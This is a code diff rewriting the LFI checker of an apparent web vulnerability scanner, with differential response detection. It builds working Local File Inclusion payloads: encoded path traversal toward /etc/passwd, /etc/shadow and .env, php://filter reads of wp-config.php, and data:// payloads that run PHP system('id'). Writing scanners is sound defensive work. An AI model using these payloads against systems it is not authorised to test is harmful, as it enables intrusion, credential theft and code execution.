@@ -1,170 +1,195 @@
-# webscanner/checkers/lfi.py
+"""Local File Inclusion checker — differential content detection with smart payloads.
+
+Combines path traversal, wrappers (php://, file://, data://), and encoding
+bypass techniques for comprehensive LFI detection.
+"""
+
 import re
-from urllib.parse import quote
+from typing import Optional, List
+
+import httpx
+
+from webscanner.checkers.base import BaseChecker
+from webscanner.core.models import CheckResult, BaselineData
 
 
-class LFI:
-    """
-    Local File Inclusion:
-      - Traversal con / y \\ (y sus encodings).
-      - Objetivos Unix y Windows sin mezclar estilos.
-      - Wrappers file://, php://filter, zip://, phar://.
-      - Heurística por contenido característico.
-    """
+class LFI(BaseChecker):
 
-    def __init__(self, max_depth: int = 8, use_null_byte: bool = False):
-        self.name = "Local File Inclusion (LFI)"
+    name = "Local File Inclusion (LFI)"
+
+    def __init__(self, max_depth: int = 8):
         self.max_depth = max_depth
-        self.use_null_byte = use_null_byte
+        self.payloads_list = self._build_payloads()
 
-        self._unix_targets_rel = [
-            "etc/passwd",
-            "etc/hosts",
-            "proc/self/environ",
-            "proc/self/cmdline",
-            "var/log/auth.log",
-        ]
-        self._win_targets_rel = [
-            "Windows/win.ini",
-            "boot.ini",
-            "Windows/System32/drivers/etc/hosts",
-        ]
-
-        self.payloads = self._build_payloads()
-
-        # Patrones
-        self._hit = [
-            # Unix
-            re.compile(r"^root:x:0:0:", re.M),
+        # Patterns that indicate LFI success (file content leaked)
+        self._hit_patterns = [
+            # /etc/passwd
+            re.compile(r"root:x:0:0:", re.M),
+            re.compile(r"[a-z_]+:[x*]:(\d+):(\d+):", re.M),
+            # /etc/hosts
             re.compile(r"\b127\.0\.0\.1\b.*localhost", re.I),
-            re.compile(r"(APACHE|NGINX|HTTP)_", re.I),  # env del proceso
-            re.compile(r"\b/bin/(bash|sh|zsh|csh|ksh)\b"),
-            re.compile(r"uid=\d+"),  # salida de id
-            re.compile(r"Linux version", re.M),
-            re.compile(r"Ubuntu|pam_unix", re.M),
-            # Windows
+            # /proc/self/environ
+            re.compile(r"(APACHE|NGINX|HTTP|PATH)_", re.I),
+            # Shell paths
+            re.compile(r"/bin/(bash|sh|zsh|dash)\b"),
+            # Windows win.ini
             re.compile(r"^\[fonts\]", re.I | re.M),
             re.compile(r"for 16-bit app support", re.I),
-            # PHP filter -> base64 (heurística de blob largo)
-            re.compile(r"^[A-Za-z0-9+/=\s]{200,}$"),
+            # Linux version
+            re.compile(r"Linux version \d+\.\d+", re.M),
+            # PHP filter base64 blob (long base64 string = file content)
+            re.compile(r"^[A-Za-z0-9+/]{100,}={0,2}$", re.M),
+            # phpinfo() output from data:// wrapper
+            re.compile(r"phpinfo\(\)|PHP Version", re.I),
+            # /etc/shadow (rare but critical)
+            re.compile(r"root:\$[0-9a-z]+\$", re.I | re.M),
+            # /proc/version
+            re.compile(r"Linux version \d+\.\d+\.\d+", re.M),
         ]
 
-        # Errores
-        self._err = [
+        # Error patterns indicating path traversal is being processed
+        self._err_patterns = [
             re.compile(r"failed to open stream", re.I),
             re.compile(r"No such file or directory", re.I),
             re.compile(r"open_basedir restriction", re.I),
-            re.compile(r"Warning:\s*(?:include|require|fopen)", re.I),
-            re.compile(r"File name too long", re.I),
-            re.compile(r"System\.IO\.", re.I),
+            re.compile(r"Warning:\s*(?:include|require|fopen|file_get_contents)", re.I),
         ]
 
-    def get_payloads(self):
-        return self.payloads
+    def get_payloads(self) -> List[str]:
+        return self.payloads_list
 
-    def check_response(self, response) -> bool:
+    def check(self, baseline: BaselineData, response: httpx.Response, payload: str) -> Optional[CheckResult]:
         body = response.text or ""
-        for rx in self._hit:
-            if rx.search(body):
-                return True
-        return False
 
-    # --------- helpers internos ---------
+        # ── 1. Content-based (differential): pattern NOT in baseline, YES in injected ──
+        for rx in self._hit_patterns:
+            if rx.search(body) and not rx.search(baseline.body):
+                return CheckResult(
+                    vuln_name=self.name,
+                    severity="critical",
+                    confidence="confirmed",
+                    location="", param="", payload=payload,
+                    status_code=response.status_code,
+                    evidence=f"File content detected: {rx.pattern[:50]}",
+                )
 
-    def _build_payloads(self):
-        out = []
+        # ── 2. Error-based (differential): error NOT in baseline, YES in injected ──
+        for rx in self._err_patterns:
+            if rx.search(body) and not rx.search(baseline.body):
+                return CheckResult(
+                    vuln_name=self.name,
+                    severity="medium",
+                    confidence="tentative",
+                    location="", param="", payload=payload,
+                    status_code=response.status_code,
+                    evidence=f"Path traversal error: {rx.pattern[:50]}",
+                )
 
-        # Traversal tokens (crudos y URL-enc)
-        ups = [
-            "../",                  # unix
-            "..%2f",                # ../
-            "%2e%2e/",              # ../
-            "..%252f",              # double-enc ../
-            # backslash
-            "..\\",                 # win
+        return None
+
+    # ── payload generation ──────────────────────────────────────
+
+    def _build_payloads(self) -> List[str]:
+        out: list[str] = []
+
+        # ── Target files ────────────────────────────────────────
+        unix_targets = [
+            "etc/passwd", "etc/hosts", "etc/shadow",
+            "proc/self/environ", "proc/version",
+        ]
+        win_targets = ["Windows/win.ini", "boot.ini"]
+
+        # ── Traversal prefixes ──────────────────────────────────
+        # Each is a single "../" equivalent using different encodings
+        traversals = [
+            "../",
+            "..%2f",
+            "%2e%2e/",
+            "%2e%2e%2f",
+            "..%252f",      # double-encoded
+            "..%c0%af",     # overlong UTF-8
+            "..\\",
             "..%5c",
-            "%2e%2e\\",
-            "..%255c",
-            # evasiones simples
-            "..././",               # bypass ingenuo
-            "..../",                # algunos normalizadores
+            "..%255c",      # double-encoded backslash
+            "..././",       # bypass naive "../" strip filter
+            "....//",       # bypass recursive strip
         ]
 
-        # Profundidades
-        depths = []
-        for d in range(1, self.max_depth + 1):
-            for u in ups:
-                depths.append(u * d)
+        # ── 1. Classic path traversal (raw + encoded) ───────────
+        for depth in range(1, self.max_depth + 1):
+            for trav in traversals:
+                prefix = trav * depth
+                for target in unix_targets:
+                    out.append(prefix + target)
+                for target in win_targets:
+                    out.append(prefix + target)
+                    out.append(prefix + target.replace("/", "\\"))
 
-        # Unix: generar con / y con %2f enc.
-        for rel in self._unix_targets_rel:
-            for prefix in depths:
-                p = prefix + rel
-                out.append(p)                  # tal cual
-                out.append(self._enc_once(p))  # encode simple
-                out.append(self._enc_twice(p))  # double-encode
-                if self.use_null_byte:
-                    out.append(p + "%00")
+        # ── 2. Absolute paths ───────────────────────────────────
+        for target in unix_targets:
+            out.append(f"/{target}")
 
-        # Windows: generar con backslash y forward slash
-        for rel in self._win_targets_rel:
-            rel_fwd = rel.replace("\\", "/")
-            rel_back = rel.replace("/", "\\")
-            for prefix in depths:
-                # prefijo en / → objetivo en /
-                p1 = prefix + rel_fwd
-                out.append(p1)
-                out.append(self._enc_once(p1))
-                out.append(self._enc_twice(p1))
-                if self.use_null_byte:
-                    out.append(p1 + "%00")
+        # ── 3. file:// wrapper + traversal ──────────────────────
+        for target in unix_targets:
+            out.append(f"file:///{target}")
+        out.append("file://C:/Windows/win.ini")
 
-                # prefijo en \ → objetivo en \
-                pref_back = prefix.replace("/", "\\")
-                p2 = pref_back + rel_back
-                out.append(p2)
-                out.append(self._enc_once(p2))
-                out.append(self._enc_twice(p2))
-                if self.use_null_byte:
-                    out.append(p2 + "%00")
+        for depth in [3, 5, 8]:
+            trav = "../" * depth
+            for target in unix_targets:
+                out.append(f"file://{trav}{target}")
 
-        # Wrappers file:// (absolutas)
-        out += [
-            "file:///etc/passwd",
-            "file:///etc/hosts",
-            "file://C:/Windows/win.ini",
-            "file://C:\\Windows\\win.ini",
-            "file://C:/boot.ini",
-            "file://C:\\boot.ini",
+        # ── 4. php://filter wrapper + traversal ─────────────────
+        # Base64 encode to exfiltrate source code
+        php_filter_targets = [
+            "index.php", "config.php", "wp-config.php",
+            "application/config/database.php",
+            ".env",
         ]
+        # php://filter on static relative targets
+        for target in php_filter_targets:
+            out.append(f"php://filter/convert.base64-encode/resource={target}")
 
-        # Wrappers PHP: php://filter (lee código fuente en base64)
-        out += [
-            "php://filter/convert.base64-encode/resource=index.php",
-            "php://filter/convert.base64-encode/resource=app.php",
-            "php://filter/convert.base64-encode/resource=config.php",
-        ]
+        # php://filter with traversal to reach files outside webroot
+        for depth in [1, 2, 3, 5]:
+            trav = "../" * depth
+            for target in php_filter_targets:
+                out.append(f"php://filter/convert.base64-encode/resource={trav}{target}")
 
-        # Otros wrappers interesantes cuando allow_url_fopen/phar están activos
-        out += [
-            # zip:// y phar:// requieren rutas válidas en el FS; aún así útil para probar paths
-            "zip://./app.zip#config.php",
-            "phar://./cache/phar.phar/config.php",
-        ]
+            # php://filter on system files (base64 encoded content)
+            for target in unix_targets:
+                out.append(f"php://filter/convert.base64-encode/resource={trav}{target}")
+                out.append(f"php://filter/read=string.rot13/resource={trav}{target}")
 
-        # Dedup preservando orden
+        # Absolute path via php://filter
+        for target in unix_targets:
+            out.append(f"php://filter/convert.base64-encode/resource=/{target}")
+            out.append(f"php://filter/read=string.rot13/resource=/{target}")
+
+        # ── 5. php://input and data:// wrappers ─────────────────
+        # data:// wrapper for RCE via file include
+        out.append("data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==")   # <?php phpinfo(); ?>
+        out.append("data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==") # <?php system('id'); ?>
+
+        # ── 6. Null-byte injection (legacy PHP < 5.3.4) ─────────
+        for depth in [3, 5, 8]:
+            trav = "../" * depth
+            for target in unix_targets:
+                out.append(f"{trav}{target}%00")
+                out.append(f"{trav}{target}\x00")
+
+        # ── 7. Double-encoding traversal to system files ────────
+        double_enc_targets = ["etc/passwd", "etc/hosts"]
+        for depth in [3, 5, 8]:
+            trav_de = "..%252f" * depth
+            for target in double_enc_targets:
+                out.append(trav_de + target)
+
+        # ── Deduplicate preserving order ────────────────────────
         seen = set()
-        uniq = []
+        unique = []
         for p in out:
             if p not in seen:
                 seen.add(p)
-                uniq.append(p)
-        return uniq
-
-    @staticmethod
-    def _enc_once(s: str) -> str:
-        return quote(s, safe="")
-
-    @staticmethod
-    def _enc_twice(s: str) -> str:
-        return quote(quote(s, safe=""), safe="")
+                unique.append(p)
+        return unique
